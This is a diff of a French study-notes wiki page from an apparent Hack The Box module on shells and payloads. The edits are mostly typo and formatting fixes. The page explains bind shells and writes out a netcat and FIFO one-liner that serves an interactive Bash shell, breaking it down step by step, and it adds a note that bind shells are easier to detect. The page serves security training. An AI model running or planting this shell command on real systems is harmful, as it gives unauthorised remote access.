@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-08T14:45:23.946Z
+date: 2025-05-08T14:49:15.348Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -91,7 +91,8 @@ Pour cela, on utilise le l'émulateur de terminal sur la machine attaquante pour
 Avec un Bind Shell, le système cible écoute les connexions entrantes.
 
 Cela peut poser des problèmes:
-- Le listener doit être démarré 
+
+- Le listener doit être démarré
 - Des règles strictes de pare-feu et du NAT en bordure de réseau, ce qui implique qu’il faut déjà être sur le réseau interne pour contourner ces protections.
 - Les Pare-feu logiciels peuvent bloquer rles connexions entrantes.
 
@@ -114,31 +115,32 @@ nc -nv <ip> 7777
 
 Après avoir vu comment envoyer du texte entre le client et le serveur, nous allons voir comment servir un shell pour établir un vrai Bind Shell.
 
-Exemple pour lier un shell Bash à la session TCP avec nc et un cannal nommé FIFO:
+Exemple pour lier un shell Bash à la session TCP avec nc et un canal nommé FIFO:
 
 ```
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ip cible> <port cible> > /tmp/f
 ```
 
 1. **`rm -f /tmp/f`**
-	Supprime le fichier `/tmp/f` s’il existe déjà.
+   Supprime le fichier `/tmp/f` s’il existe déjà.
 
 2. **`mkfifo /tmp/f`**
-	Crée un pipe nommé (FIFO) pour permettre la communication entre processus.
+   Crée un pipe nommé (FIFO) pour permettre la communication entre processus.
 
 3. **`cat /tmp/f | /bin/bash -i`**
-	Envoie les commandes lues du pipe à un shell interactif Bash.
+   Envoie les commandes lues du pipe à un shell interactif Bash.
 
 4. **`2>&1`**
-	Redirige les erreurs vers la sortie standard pour tout récupérer.
+   Redirige les erreurs vers la sortie standard pour tout récupérer.
 
 5. **`| nc -l 10.129.41.200 7777`**
-	Envoie la sortie du shell à Netcat, qui écoute sur l’IP et le port donnés.
+   Envoie la sortie du shell à Netcat, qui écoute sur l’IP et le port donnés.
 
 6. **`> /tmp/f`**
-	Redirige ce que Netcat reçoit vers le pipe.
-  
-La ocmmande ci-dessu est donc considérée comme le payload.
+   Redirige ce que Netcat reçoit vers le pipe.
 
+La commande ci-dessu est donc considérée comme le payload.
 
+Nous avons établi avec succès une session bind shell. Cela a été réalisé sans aucune mesure de sécurité en place (comme les routeurs avec NAT, pare-feux matériels, WAF, IDS/IPS, pare-feux système, antivirus, ou mécanismes d'authentification).
 
+Il ne faut pas oublier qu'il est plus facile de se défendre face à un Bind Shell puisque les connexions entrantes sont plus détectables.
